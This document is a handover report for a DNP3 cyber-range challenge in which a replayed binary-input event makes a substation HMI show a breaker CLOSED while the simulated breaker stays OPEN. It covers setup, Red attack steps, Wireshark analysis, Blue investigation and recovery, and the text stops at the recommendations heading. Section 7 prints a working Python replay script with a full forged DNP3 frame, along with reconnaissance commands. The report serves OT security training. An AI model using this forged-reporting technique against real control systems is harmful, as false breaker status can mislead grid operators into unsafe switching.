
**DNP3 Forged Breaker-Status Report**


**Complete Technical and Non-Technical Challenge Report**


**Red Module | Blue Module | Red-vs-Blue Module**


<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/DNP3-Forged-Breaker-Status/media/image1.png" title="Figure 1" style="width:6.65in;height:4.61806in" alt="DNP3 challenge runtime architecture showing Red workstation, replay ingress, proxy, DNP3 endpoint, truth, outstations, master, HMI and evidence." />

*Figure 1. High-level architecture of the validated native OpenDNP3 challenge.*


**RUNTIME**


**PASS**


**RED ATTACK**


**PASS**


**BLUE EVIDENCE**


**PASS**


**RECOVERY**


**PASS**


**Prepared for Hacktify Technologies Pvt. Ltd.**

Validation date: 22 July 2026 \| Document version: 1.1 - Final Handover

# Document Control and Validation Statement

**Table 1. Document and validation identifiers**

| **Field** | **Validated value** |
|----|----|
| Challenge name | DNP3 Forged Breaker-Status Report |
| Delivery modes | Red Module, Blue Module, and Red-vs-Blue Module |
| Difficulty | Intermediate |
| Industrial technology | OpenDNP3 3.1.2 master/outstations, DNP3 over TCP |
| Validated platform | Ubuntu 22.04.5 LTS, x86_64, native systemd deployment |
| MITRE ATT&CK for ICS | TA0106 - Impair Process Control / T1692.002 - Unauthorized Message: Reporting Message |
| Validation target | 203.0.0.161 |
| Observed Red/NAT source | 172.24.4.1 |
| Source package SHA-256 | b82cc90baae9636be836975c8300d2ef4b84dc0325975da8421596daa304156a |
| Evidence archive SHA-256 | a1ddb7b19823865440e764e79a4302567b2bc134584f014d9716fe30a8f90567 |


**Validation statement**


The challenge was installed on a clean Ubuntu 22.04.5 x86_64 VM, exercised manually from WSL/Kali, observed through Windows Wireshark SSH remote capture, investigated using native logs and runtime state, reset to the approved baseline, and revalidated for service availability. The attack changed the operator-reported state without changing the independent physical truth.



Final packaging status

The final handover ZIP now preserves Unix executable modes for all shell scripts and packaged OpenDNP3 binaries. Empty package directories were removed, the revised DOCX and available Wireshark evidence were added outside the three module directories, root checksums were regenerated, and a clean fresh-extraction verification passed.


## Acceptance summary

**Table 2. End-to-end acceptance status**

| **Validation area** | **Result** | **Evidence** |
|----|----|----|
| Package integrity | PASS | ZIP SHA-256 verified; internal manifests present |
| Clean setup | PASS | Dependencies, runtime installation, reset and validation markers completed |
| External discovery | PASS | TCP/8088, TCP/20000 and TCP/20003 reachable |
| Red replay | PASS | 123-byte reporting event accepted with DNP3_REPLAY_ACCEPTED |
| Impact | PASS | Master/HMI changed from OPEN to CLOSED |
| Safety property | PASS | Physical truth remained OPEN; physical_state_changed=false |
| Blue investigation | PASS | Source, payload, proxy mode, master state and mismatch correlated |
| Evidence collection | PASS | Tar archive created and transfer SHA-256 matched |
| Recovery | PASS | Truth OPEN, master OPEN, proxy legitimate, mismatch false |
| Service availability | PASS | Eight services, five listeners and functional probes healthy |

# Contents

1.  1\. Executive Summary

2.  2\. Non-Technical Challenge Storyline

3.  3\. Technical Architecture and Data Flow

4.  4\. Three-Module Delivery Design

5.  5\. Deployment and Setup

6.  6\. Clean Baseline and Expected Operation

7.  7\. Red Team Attack Workflow

8.  8\. Wireshark Capture and Packet Analysis

9.  9\. Blue Team Investigation and Root Cause

10. 10\. Containment, Recovery and Validation

11. 11\. Red-vs-Blue Exercise Choreography

12. 12\. Assessments, Reports and TTP Integration

13. 13\. Validation Results and Evidence Integrity

14. 14\. Security Recommendations

15. 15\. Known Limitations and Operational Notes

16. 16\. Final Handover Checklist

17. Appendix A. Exact Commands

18. Appendix B. Evidence and File Inventory

19. Appendix C. Assessment Answer Summary

20. Appendix D. Glossary


**How to use this report**


The first sections explain the scenario in simple language for management and non-technical stakeholders. The later sections provide exact architecture, commands, logs, packet-analysis filters, evidence paths, assessment logic and recovery validation for technical reviewers and exercise controllers.


# 1. Executive Summary

This exercise demonstrates a realistic OT reporting-deception problem: the operator-facing DNP3 breaker status can be changed to CLOSED even though the independently simulated physical breaker remains OPEN. The attacker does not issue a real breaker operate command. Instead, a valid DNP3 binary-input reporting event is replayed through a controlled ingress service, causing the reporting proxy, master and HMI to accept a believable but false process state.

The challenge is safe for training because the physical truth is maintained separately from the reported value. This allows Red participants to demonstrate an unauthorized reporting message, while Blue participants can prove the contradiction using independent truth, replay-ingress, proxy, master, mismatch and packet evidence.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/DNP3-Forged-Breaker-Status/media/image2.png" title="Figure 2" style="width:6.55in;height:2.57906in" alt="Comparison of independent physical truth OPEN and master or HMI reported state CLOSED." />

*Figure 2. The central safety property: physical truth stays OPEN while the master/HMI can be deceived into showing CLOSED.*

## Executive outcome

- **Red Team:** Discovered the exposed HMI and DNP3 services, submitted a valid 123-byte Group 2 Variation 2 event, received DNP3_REPLAY_ACCEPTED, and verified the HMI changed to CLOSED.

- **Blue Team:** Preserved evidence, confirmed the physical truth was OPEN, identified the replay source and payload hash, correlated the forged proxy path and master state, and generated a HIGH-severity mismatch finding.

- **Recovery:** The official reset returned truth and master to OPEN, selected the legitimate backend, cleared the active mismatch and kept all services available.

- **Operational value:** The exercise teaches that an available and apparently healthy control system can still present false process information to operators.


**Final runtime verdict**


The tested challenge behavior is complete and operational. Setup, attack, investigation, evidence collection, reset, service validation and evidence-transfer integrity all passed.


# 2. Non-Technical Challenge Storyline

## 2.1 Real-world story

A substation control room relies on a screen to show whether breaker SUBSTATION-BKR-01 is OPEN or CLOSED. During routine operations, the display unexpectedly shows CLOSED. The important question is not merely whether the screen changed, but whether the real breaker changed.

In this challenge, the real breaker condition and the displayed condition are deliberately separated. An attacker can manipulate the reporting path so that the screen shows CLOSED while the independent process simulator still shows OPEN. This mirrors a real operational risk: an operator may make decisions using a believable but false status indication.

## 2.2 What the Red Team does

- Discovers the externally reachable services from the assigned target IP.

- Checks the operator display to record the baseline state.

- Identifies the controlled reporting-message replay surface.

- Submits a valid forged DNP3 breaker-status event.

- Confirms the target accepted the event and the HMI changed to CLOSED.

- Avoids issuing a real breaker command or damaging the host.

## 2.3 What the Blue Team does

- Confirms services remain available even though the displayed value is suspicious.

- Preserves logs, runtime state, journals, listeners, HMI responses and packet captures.

- Compares independent physical truth with the master/HMI report.

- Identifies the replay source, payload size, object variation and acceptance event.

- Builds a timeline from replay ingress through proxy selection, master update and mismatch alert.

- Restores the approved baseline and verifies normal operation.

## 2.4 What happens in Red-vs-Blue mode

Red and Blue teams operate against the same live environment. Red attempts a reporting-message deception. Blue monitors and investigates without being told the attack steps. Both teams produce evidence-based reports. The exercise controller uses the setup TTP, service-availability TTP, assessments and reporting templates to manage and score the exercise.

## 2.5 Why the scenario matters

**Table 3. Business and operational significance**

| **Operational concern** | **Why it matters** |
|----|----|
| False status indication | Operators may take switching, isolation or restoration decisions based on incorrect information. |
| Healthy services do not guarantee trustworthy data | All services and ports can remain UP while the process view is wrong. |
| Reporting attack versus control attack | The scenario teaches analysts to distinguish false telemetry from a real command or physical change. |
| Independent truth source | A separate process-truth record enables reliable detection and safe training. |
| Evidence correlation | No single log is sufficient; confidence comes from joining network, application, master and process evidence. |

# 3. Technical Architecture and Data Flow

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/DNP3-Forged-Breaker-Status/media/image1.png" title="Figure 3" style="width:6.65in;height:4.61806in" alt="Detailed DNP3 challenge runtime architecture and evidence paths." />

*Figure 3. Detailed runtime architecture, externally reachable services, loopback-only outstations and evidence paths.*

## 3.1 Core design principles

- **Native implementation:** OpenDNP3 3.1.2 master and outstation binaries are deployed as native Ubuntu systemd services.

- **Safe state separation:** The independent truth simulator controls the physical OPEN state separately from the master-reported state.

- **Controlled attack surface:** A dedicated replay ingress accepts the validated exercise frame on TCP/20003.

- **Participant isolation:** The HMI exposes only the master-reported state and intentionally hides truth_state and mismatch fields.

- **Defender observability:** JSONL logs, runtime JSON files, systemd journals and rotating PCAPs record the complete chain.

## 3.2 Network endpoints

**Table 4. Validated listening endpoints**

| **Port** | **Binding/scope** | **Component** | **Purpose** |
|----|----|----|----|
| 8088/TCP | 0.0.0.0 - participant-facing | Operator HMI | HTML/API view of the master-reported breaker state |
| 20000/TCP | 0.0.0.0 - participant-facing | DNP3 proxy endpoint | DNP3 reporting path consumed by the master |
| 20003/TCP | 0.0.0.0 - participant-facing | Replay ingress | Accepts a validated REPLAY message and changes the reporting path |
| 20001/TCP | 127.0.0.1 only | Legitimate outstation | Reports the truthful OPEN state |
| 20002/TCP | 127.0.0.1 only | Forged outstation | Reports the false CLOSED state |

## 3.3 Systemd services

**Table 5. Eight-service runtime model**

| **Service** | **Role** |
|----|----|
| dnp3-breaker-truth.service | Maintains independent breaker truth and writes truth evidence. |
| dnp3-breaker-legitimate-outstation.service | OpenDNP3 outstation that reports the approved OPEN state. |
| dnp3-breaker-forged-outstation.service | OpenDNP3 outstation that reports the exercise CLOSED state. |
| dnp3-breaker-proxy.service | Selects the legitimate or forged backend for TCP/20000. |
| dnp3-breaker-replay-ingress.service | Validates replay input, records source details and changes proxy mode. |
| dnp3-breaker-master.service | Polls the public DNP3 endpoint and writes master-status.json. |
| dnp3-breaker-hmi.service | Publishes /health and /api/status on TCP/8088. |
| dnp3-breaker-capture.service | Creates rotating packet capture evidence. |

## 3.4 Primary runtime and evidence locations

**Table 6. Operational file locations**

| **Location** | **Contents** |
|----|----|
| /opt/ot-challenges/dnp3-forged-breaker-status/runtime/ | truth-state.json, master-status.json, proxy-mode.json |
| /opt/ot-challenges/dnp3-forged-breaker-status/config/ | physical-breaker-state and forged-breaker-event.hex |
| /var/log/otlab/dnp3-forged-breaker-status/ | JSONL evidence, mismatch alerts, rotating PCAP and service logs |
| /etc/systemd/system/ | Installed dnp3-breaker-\*.service units and lab target |

# 4. Three-Module Delivery Design

The release contains three independently installable versions built from the same validated common core. This preserves technical consistency while changing participant material, assessments and reporting requirements according to role.

**Table 7. Role-specific module design**

| **Module** | **Participant purpose** | **Key deliverables** |
|----|----|----|
| Red Module | Black-box discovery and authorized reporting-message attack | Description.md, setup.sh, Red-Writeup.md, Assessment.xlsx, attack script, setup/attack/service-availability TTPs |
| Blue Module | Detection, evidence preservation, investigation, root cause and recovery | Description.md, setup.sh, Blue-Writeup.md, Assessment.xlsx, Red attack injector, evidence collector, reset and Blue-tagged attack TTP |
| Red-vs-Blue Module | Simultaneous live exercise using a shared environment | Both write-ups and assessments, Setup-TTP.yml, Service-Availability-TTP.yml, Attack-TTP.yml, INREP, SITREP and Red Report templates |

## 4.1 Red Module

- Presents a non-spoiling mission based on target IP only.

- Requires participants to discover TCP/8088, TCP/20000 and TCP/20003.

- Uses a finding-based final answer: DNP3_REPLAY_ACCEPTED.

- Includes three MCQs and two fill-in-the-blank questions.

- Creator-only material documents internal services, ports, payload and evidence paths.

## 4.2 Blue Module

- Begins from an unexpected HMI status change while services remain operational.

- Requires evidence preservation before containment or reset.

- Uses truth.jsonl as the independent physical source and master/mismatch/replay evidence for correlation.

- Uses a finding-based final contradiction: TRUTH:OPEN\|MASTER:CLOSED.

- Includes the real attack injector so the exercise controller can seed the incident.

## 4.3 Red-vs-Blue Module

- Links the setup TTP to the service-availability TTP through service_availability_id.

- Provides a Blue-tagged attack TTP using the installed attack script.

- Requires Red and Blue teams to create separate assessments and exercise reports.

- Includes INREP, SITREP and Red Report templates for operational reporting.

- Uses one shared runtime so that Red actions create evidence immediately available to Blue.

## 4.4 Package hygiene observations


Empty-directory cleanup completed

The unused standalone Reports/ directories and the empty Red-vs-Blue ttps/ directory were removed from the final handover package. No required runtime, assessment, TTP or reporting content was removed.



Executable permissions finalised

The final ZIP stores executable mode on every shell script and on the packaged OpenDNP3 binaries. Fresh extraction confirmed the modes, and each module's verify-package.sh completed successfully.


# 5. Deployment and Setup

## 5.1 Supported environment

**Table 8. Validated deployment environment**

| **Requirement** | **Validated value** |
|----|----|
| Operating system | Ubuntu 22.04.5 LTS |
| Architecture | x86_64 / amd64 |
| Init/service manager | systemd |
| Privileges | sudo/root required for installation |
| Network | Participant access to target TCP/8088, TCP/20000 and TCP/20003 |
| Red workstation | Kali Linux in WSL |
| Packet analysis | Windows Wireshark using SSH remote capture / sshdump |

## 5.2 Standard module setup

**Setup command**


cd <extracted-module-directory>

chmod +x *.sh Challenge-Core/*.sh Challenge-Core/scripts/*.sh

sudo ./setup.sh


Each module wrapper installs dependencies, installs the native runtime under /opt/ot-challenges/dnp3-forged-breaker-status, installs and enables the systemd target, waits for the services, resets to a safe baseline and validates the full environment.

**Expected successful markers**


DEPENDENCY_INSTALLATION:PASS

RUNTIME_INSTALLATION:PASS

RESET_SUCCESS

RUNTIME_VALIDATION:PASS

Setup Successfully

SERVICE_STATUS:UP | SYSTEMD:UP | PORTS:UP | PROBES:UP


## 5.3 Setup actions performed internally

21. Install required operating-system utilities and validation tools.

22. Create the challenge service identity and runtime/log directories.

23. Copy packaged OpenDNP3 binaries, Python services, web content and configuration files.

24. Initialise clean runtime JSON and JSONL evidence files.

25. Install the eight systemd service units and the dnp3-breaker-lab.target.

26. Enable and restart the target, then wait for all services.

27. Validate all service states, endpoint scope, required files, baseline state, HMI health, payload validity and evidence generation.

28. Print Setup Successfully only after the environment is ready.

## 5.4 First health verification


sudo ./service-availability.sh



# Expected

SERVICE_STATUS:UP | SYSTEMD:UP | PORTS:UP | PROBES:UP


The service-availability check uses three independent vectors. All eight services must be active, all five ports must be listening, and HMI/DNP3/replay functional probes must succeed. Any failed vector returns a non-zero exit code and marks the service DOWN.

# 6. Clean Baseline and Expected Operation

## 6.1 Baseline state

**Table 9. Approved clean state**

| **State source**           | **Expected baseline** |
|----------------------------|-----------------------|
| Independent physical truth | OPEN                  |
| Master-reported state      | OPEN                  |
| Operator HMI               | OPEN                  |
| Proxy mode                 | legitimate            |
| Truth-to-master mismatch   | false                 |
| Physical control coil      | not energized         |

**Validated participant-facing baseline**


curl -fsS http://<TARGET>:8088/api/status | jq .



{

"online": true,

"breaker_id": "SUBSTATION-BKR-01",

"reported_state": "OPEN",

"reported_closed": false,

"dnp3_point_type": "Binary Input",

"dnp3_point_index": 0,

"source": "DNP3 master station"

}


## 6.2 Participant HMI isolation control

The /api/status endpoint intentionally returns only master-observed fields. It does not disclose truth_state or mismatch. This prevents Red participants from receiving Blue-only evidence and makes the exercise require independent investigation.

## 6.3 External reconnaissance result

**Validated external scan**


nmap -Pn -sT -p 8088,20000,20003 203.0.0.161



8088/tcp open radan-http

20000/tcp open dnp

20003/tcp open commtact-https



**Interpretation**


The service labels returned by Nmap are only heuristics. Participants must verify function through protocol behavior and the operator API. The loopback-only outstations on TCP/20001 and TCP/20002 are correctly absent from the external scan.


# 7. Red Team Attack Workflow

## 7.1 Objective

Cause the operator-facing breaker state to display CLOSED by replaying a valid reporting event, while leaving the actual breaker truth OPEN and avoiding any binary-output operate command.

## 7.2 Reconnaissance and baseline


export TARGET=203.0.0.161

nmap -Pn -sT -p 8088,20000,20003 "$TARGET"

curl -fsS "http://$TARGET:8088/api/status" | jq .


## 7.3 Packaged attack utility


bash ./Red-Team-Attack.sh "$TARGET"



# Successful target response

DNP3_REPLAY_ACCEPTED


The attack wrapper reads the packaged forged-breaker-event.hex payload, validates it as hexadecimal, connects to TCP/20003, transmits REPLAY followed by the payload and exits successfully only when the server replies DNP3_REPLAY_ACCEPTED.

## 7.4 Manually validated replay


TARGET="203.0.0.161"

python3 - "$TARGET" <<'PY'

import socket, sys

target = sys.argv[1]

payload_hex = (

"0564684401000a00265cc1e081900002022801000000811aaa36ebc9e99e"

"010102000000810302000000021e501f0500000002000000001401000000"

"0200ba00000000150100000002000000000a020093720000022801000000"

"0200000000320400efd2000000000000000000000000006e010005a00000"

"00ffff"

)

payload = bytes.fromhex(payload_hex)

print(f"DNP3_PAYLOAD_BYTES={len(payload)}")

with socket.create_connection((target, 20003), timeout=8) as conn:

conn.sendall(f"REPLAY {payload_hex}\n".encode("ascii"))

print("SERVER_RESPONSE=" + conn.recv(4096).decode().strip())

PY


**Validated response**


DNP3_PAYLOAD_BYTES=123

TARGET=203.0.0.161:20003

SERVER_RESPONSE=DNP3_REPLAY_ACCEPTED


## 7.5 Impact validation


sleep 10

curl -fsS "http://$TARGET:8088/api/status" |

jq '{breaker_id,reported_state,reported_closed,dnp3_point_type,dnp3_point_index}'



{

"breaker_id": "SUBSTATION-BKR-01",

"reported_state": "CLOSED",

"reported_closed": true,

"dnp3_point_type": "Binary Input",

"dnp3_point_index": 0

}


## 7.6 Why this is a reporting-message attack

- The payload is a DNP3 binary-input event using Group 2 Variation 2.

- The replay ingress records payload_size=123 and physical_state_changed=false.

- No binary-output operate action is required.

- The proxy changes from the legitimate reporting backend to the forged backend.

- The master and HMI believe CLOSED while the independent truth remains OPEN.

- The exact MITRE mapping is T1692.002 - Unauthorized Message: Reporting Message.

# 8. Wireshark Capture and Packet Analysis

## 8.1 Capture method

Windows Wireshark captured the target VM remotely through the SSHdump extcap interface. The Windows client authenticated to ubuntu@203.0.0.161 using a dedicated RSA key and executed tcpdump with passwordless sudo. The external interface was ens3.

**Table 10. Windows SSH remote capture configuration**

| **Setting**      | **Validated value**                       |
|------------------|-------------------------------------------|
| Remote host      | 203.0.0.161:22                            |
| SSH user         | ubuntu                                    |
| Private key      | C:\Users\Admin\\ssh\wireshark-sshdump-rsa |
| Remote interface | ens3                                      |
| Privilege mode   | sudo                                      |
| Capture filter   | tcp port 20003 or tcp port 20000          |

## 8.2 Useful display filters

**Table 11. Validated packet-analysis filters**

| **Purpose**                   | **Wireshark display filter**              |
|-------------------------------|-------------------------------------------|
| All replay-ingress traffic    | tcp.port == 20003                         |
| Application-data packets only | tcp.port == 20003 && tcp.len \> 0         |
| External Red replay only      | tcp.port == 20003 && ip.src == 172.24.4.1 |
| DNP3 reporting path           | dnp3 \|\| tcp.port == 20000               |
| Internal master/proxy traffic | tcp.port == 20000 && ip.addr == 127.0.0.1 |

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/DNP3-Forged-Breaker-Status/media/image3.png" title="Figure 4" style="width:6.65in;height:3.3859in" alt="Wireshark SSHdump packet list showing external replay traffic from 172.24.4.1 to 203.0.0.161 TCP port 20003." />

*Figure 4. Live SSHdump capture on ens3 showing the external Red/NAT source 172.24.4.1 sending the replay to 203.0.0.161:20003 and the server returning application data.*

## 8.3 TCP stream proof

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/DNP3-Forged-Breaker-Status/media/image4.png" title="Figure 5" style="width:6.65in;height:3.50769in" alt="Wireshark Follow TCP Stream showing REPLAY hexadecimal data and DNP3_REPLAY_ACCEPTED response." />

*Figure 5. Follow TCP Stream evidence showing the full REPLAY hexadecimal message and the server response DNP3_REPLAY_ACCEPTED.*

**Table 12. TCP stream interpretation**

| **Stream element** | **Interpretation** |
|----|----|
| REPLAY 05646844... | Client-to-server exercise command containing the validated DNP3 frame. |
| DNP3_REPLAY_ACCEPTED | Server-to-client confirmation that the frame passed replay validation and was applied. |
| 172.24.4.1 -\> 203.0.0.161:20003 | Observed network source and replay-ingress destination after upstream NAT. |
| 254-byte TCP data segment | ASCII REPLAY prefix plus 246 hexadecimal characters and newline. |

## 8.4 DNP3 reporting traffic and dissector note

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/DNP3-Forged-Breaker-Status/media/image5.png" title="Figure 6" style="width:6.65in;height:3.51744in" alt="Wireshark internal TCP port 20000 DNP3 reporting traffic on loopback." />

*Figure 6. Internal TCP/20000 traffic captured on loopback. Wireshark identifies DNP 3.0 traffic; some reassembled packets are labelled malformed by the dissector.*


**Wireshark caveat**


The malformed label on some internal reassembled packets is a dissector/reassembly presentation issue in this capture. It does not invalidate the challenge. Functional probes, the OpenDNP3 master/outstations, payload validator, HMI state, replay acceptance and native logs independently confirmed correct behavior.


## 8.5 Byte-level and object-level findings

**Table 13. Validated replay characteristics**

| **Finding** | **Value** |
|----|----|
| Payload length | 123 bytes |
| Object group | 2 - Binary Input Event |
| Object variation | 2 - Group 2 Variation 2 |
| Reported breaker value | CLOSED / true |
| Physical state changed | false |
| Acceptance marker | DNP3_REPLAY_ACCEPTED |
| Payload SHA-256 | fef54cea40233cb2491f52c88d283e7d419b5be4b15e8f11745db60eeb32200f |

# 9. Blue Team Investigation and Root Cause

## 9.1 Preserve evidence first


cd <Red-vs-Blue-module>

sudo ./collect-evidence.sh



EVIDENCE_COLLECTION:PASS

Archive: .../dnp3-forged-breaker-evidence-20260722T120913Z.tar.gz


The collector copies the complete log directory and runtime state, captures systemd status, journals, listeners, HMI health/status, generates SHA-256 hashes for every collected file and creates a compressed evidence archive.

## 9.2 Establish independent truth


sudo jq . /opt/ot-challenges/dnp3-forged-breaker-status/runtime/truth-state.json



{

"authoritative": true,

"breaker_closed": false,

"breaker_id": "SUBSTATION-BKR-01",

"control_coil_energized": false,

"physical_state": "OPEN",

"position_sensor": "OPEN",

"source": "independent-process-simulator"

}


## 9.3 Compare the master and HMI


sudo jq . /opt/ot-challenges/dnp3-forged-breaker-status/runtime/master-status.json



reported_state: CLOSED

reported_closed: true

truth_state: OPEN

truth_closed: false

mismatch: true

measurement_flags: 129

group_variation: 258


## 9.4 Identify proxy mode and source


sudo jq . /opt/ot-challenges/dnp3-forged-breaker-status/runtime/proxy-mode.json



mode: forged

physical_breaker_changed: false

replay_source_ip: 172.24.4.1

reported_breaker_state: CLOSED


## 9.5 Replay-ingress evidence


{

"event": "DNP3_REPORTING_MESSAGE_REPLAY_ACCEPTED",

"accepted": true,

"source_ip": "172.24.4.1",

"source_port": 64000,

"payload_size": 123,

"payload_sha256": "fef54cea40233cb2491f52c88d283e7d419b5be4b15e8f11745db60eeb32200f",

"object_group": 2,

"object_variation": 2,

"replayed_state": "CLOSED",

"physical_state_changed": false

}


## 9.6 High-severity mismatch


{

"event": "DNP3_TRUTH_MISMATCH",

"severity": "HIGH",

"breaker_id": "SUBSTATION-BKR-01",

"reported_state": "CLOSED",

"truth_state": "OPEN",

"dnp3_point_index": 0

}



**Confirmed contradiction**


TRUTH:OPEN|MASTER:CLOSED


## 9.7 Root-cause conclusion

The incident was caused by an accepted forged DNP3 reporting event. The replay ingress validated the 123-byte frame and selected the forged reporting path. The master accepted the resulting CLOSED binary-input event and the HMI displayed CLOSED. The independent process simulator continued to record OPEN, proving that this was a reporting deception rather than an actual breaker operation.

## 9.8 Evidence correlation timeline

**Table 14. Defensible event timeline**

| **Sequence** | **Evidence source** | **Confirmed event** |
|----|----|----|
| 1 | truth-state.json / truth.jsonl | Breaker remains OPEN and control coil is not energised. |
| 2 | replay-ingress.jsonl | External source submits a 123-byte Group 2 Variation 2 event; acceptance recorded. |
| 3 | proxy-mode.json / proxy.jsonl | Reporting path changes from legitimate to forged. |
| 4 | master-status.json / master.jsonl | Master updates Binary Input index 0 to CLOSED. |
| 5 | HMI /api/status | Operator view changes to CLOSED. |
| 6 | mismatch-alerts.jsonl | HIGH alert records truth OPEN versus master CLOSED. |
| 7 | PCAP / Wireshark | Network source, TCP/20003 payload and acceptance response are visible. |

# 10. Containment, Recovery and Validation

## 10.1 Recovery action


sudo ./reset.sh



[+] Physical breaker truth restored to OPEN.

[+] Legitimate DNP3 reporting path selected.

[+] Runtime evidence preserved.

RESET_SUCCESS

Physical truth: OPEN

Master display: OPEN

Proxy mode: legitimate

Mismatch: false


The default reset preserves evidence. It writes the approved physical state, selects the legitimate backend and waits up to 30 seconds for the truth, master, proxy and mismatch values to converge to the safe baseline.

## 10.2 Post-recovery service check


sudo ./service-availability.sh



SERVICE_STATUS:UP | SYSTEMD:UP | PORTS:UP | PROBES:UP


## 10.3 Final recovered state


{

"physical_state": "OPEN",

"breaker_closed": false

}

{

"reported_state": "OPEN",

"reported_closed": false,

"mismatch": false

}

{

"online": true,

"breaker_id": "SUBSTATION-BKR-01",

"reported_state": "OPEN",

"reported_closed": false

}


<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/DNP3-Forged-Breaker-Status/media/image6.png" title="Figure 7" style="width:6.65in;height:2.66in" alt="Validated challenge lifecycle from clean baseline through Red replay, false view, Blue investigation and recovery." />

*Figure 7. Validated end-to-end lifecycle from clean baseline through Red replay, Blue investigation and safe recovery.*

## 10.4 Operational recovery meaning

- The physical truth is confirmed OPEN.

- The master and HMI again agree with the truth.

- The proxy uses the legitimate backend on TCP/20001.

- The active mismatch is cleared.

- Runtime attack evidence is retained for later review.

- All eight services, five ports and functional probes remain healthy.

# 11. Red-vs-Blue Exercise Choreography

**Table 15. Live exercise sequence**

| **Phase** | **Red Team** | **Blue Team** | **Controller** |
|----|----|----|----|
| Preparation | Receives target IP and non-spoiling mission. | Receives defender mission and approved access. | Runs setup and verifies service-availability TTP. |
| Baseline | Performs reconnaissance and records HMI state. | Confirms service health and monitoring sources. | Records clean baseline and start time. |
| Attack | Submits the reporting event and validates CLOSED display. | Detects unexplained state change and preserves evidence. | Observes actions and prevents out-of-scope activity. |
| Investigation | Documents attack path and technical evidence. | Correlates truth, replay, proxy, master, mismatch and PCAP. | Scores findings and reporting quality. |
| Recovery | Stops further activity. | Runs approved reset and validates recovery. | Confirms safe state and closes exercise. |
| Reporting | Completes Red Report and assessment. | Completes INREP/SITREP and assessment. | Conducts debrief and captures lessons learned. |

## 11.1 Exercise rules

- Do not damage the host, disable required services or delete evidence.

- Do not access systems outside the assigned target.

- Do not reveal implementation details to the opposing team.

- Red participants must not be given internal ports, paths, service names, payload files or scoring logic before completion.

- Blue must preserve evidence before reset or containment.

- The exercise controller owns final reset and safe-state confirmation.

## 11.2 Reporting outputs

**Table 16. Red-vs-Blue reporting templates**

| **Report** | **When used** | **Required contents** |
|----|----|----|
| INREP | Immediately after initial confirmation | Observed state, independent truth, source, affected asset, service status, preliminary risk and next action. |
| SITREP | After correlation and recovery | Timeline, confirmed source/payload/object, containment, recovery, service validation and outstanding risk. |
| Red Report | After attack completion | Reconnaissance, attack path, acceptance marker, impact validation, MITRE mapping, detection opportunities and cleanup statement. |

# 12. Assessments, Reports and TTP Integration

## 12.1 Assessment design

**Table 17. Assessment structure**

| **Assessment** | **Format** | **Final finding** |
|----|----|----|
| Red | 3 MCQ + 2 fill in the blank | DNP3_REPLAY_ACCEPTED |
| Blue | 3 MCQ + 2 fill in the blank | TRUTH:OPEN\|MASTER:CLOSED |
| Red-vs-Blue | Separate Red and Blue workbooks | Uses the same role-specific findings |

## 12.2 Red assessment learning coverage

- Identification of DNP3 on TCP/20000.

- Identification of Group 2 Variation 2.

- Correct MITRE ATT&CK for ICS mapping to T1692.002.

- Observation that the HMI changed to CLOSED.

- Exact replay acceptance marker.

## 12.3 Blue assessment learning coverage

- Identification of truth.jsonl as the independent physical source.

- Correlation of truth OPEN, master CLOSED and mismatch alert.

- Correct MITRE mapping to unauthorized reporting message.

- Identification of Group 2 Variation 2 in packet/payload evidence.

- Exact contradiction TRUTH:OPEN\|MASTER:CLOSED.

## 12.4 Setup and attack TTPs

**Table 18. TTP integration**

| **TTP** | **ID / role** | **Command behavior** |
|----|----|----|
| Setup TTP | OT-DNP3-ForgedBreakerStatus-Setup-RvB | Prints only Setup Successfully and links to the service-availability UUID. |
| Service Availability TTP | d8b2a6b1-f3c7-4f63-9f4e-2a18d5c90b71 | Checks eight systemd services, five ports and four functional/isolation probes. |
| Attack TTP | OT-DNP3-ForgedBreakerStatus-RvB-Attack | Runs the installed authorized attack script against 127.0.0.1 with tag blue. |

## 12.5 Three-vector service-availability logic

- **Systemd vector:** All eight dnp3-breaker services must be active.

- **Port vector:** TCP/20000, 20001, 20002, 20003 and 8088 must be listening.

- **Functional vector:** HMI health must be healthy; participant API must hide truth/mismatch; TCP/20000 and TCP/20003 probes must succeed.

- **Decision:** Any failed vector marks the challenge service DOWN and returns exit code 1.

# 13. Validation Results and Evidence Integrity

## 13.1 Clean-VM acceptance


DEPENDENCY_INSTALLATION:PASS

RUNTIME_INSTALLATION:PASS

RESET_SUCCESS

RUNTIME_VALIDATION:PASS

Setup Successfully

CLEAN_VM_ATTACK_TEST:PASS

CLEAN_VM_RESET_TEST:PASS

CLEAN_VM_ATTACK_AND_RESET:PASS

RUNTIME_VALIDATION:PASS (after reboot)

CLEAN_VM_ACCEPTANCE:PASS


## 13.2 Manual validation performed

**Table 19. Manual acceptance evidence**

| **Test** | **Observed result** |
|----|----|
| VM identity | Ubuntu 22.04.5 LTS, x86_64, host kaif---testvm |
| External connectivity | 8088, 20000 and 20003 open |
| Baseline HMI | OPEN / false |
| Replay submission | DNP3_PAYLOAD_BYTES=123; DNP3_REPLAY_ACCEPTED |
| Attacked HMI | CLOSED / true |
| Physical truth | OPEN / false |
| Replay attribution | 172.24.4.1, source port recorded |
| Mismatch | HIGH severity, reported CLOSED, truth OPEN |
| Evidence collection | EVIDENCE_COLLECTION:PASS |
| Recovery | RESET_SUCCESS; OPEN/OPEN; legitimate; mismatch false |
| Final availability | SERVICE_STATUS:UP \| SYSTEMD:UP \| PORTS:UP \| PROBES:UP |

## 13.3 Evidence archive integrity


Archive: dnp3-forged-breaker-evidence-20260722T120913Z.tar.gz

REMOTE_SHA256=a1ddb7b19823865440e764e79a4302567b2bc134584f014d9716fe30a8f90567

LOCAL_SHA256=a1ddb7b19823865440e764e79a4302567b2bc134584f014d9716fe30a8f90567

DNP3_EVIDENCE_TRANSFER_INTEGRITY=PASS


## 13.4 Evidence archive contents

- Complete /var/log/otlab/dnp3-forged-breaker-status log tree.

- Runtime truth, master and proxy state files.

- Systemd status for all dnp3-breaker services.

- Two-hour service journal export.

- Listener inventory.

- HMI health and status JSON.

- Per-file SHA256SUMS manifest.

- Compressed tar.gz archive for handover.


**Integrity conclusion**


The server and Windows copies of the evidence archive produced identical SHA-256 values. The transfer is verified and the archive is suitable for inclusion in the challenge validation evidence set.


# 14. Security Recommendations

## 14.1 Network and protocol controls

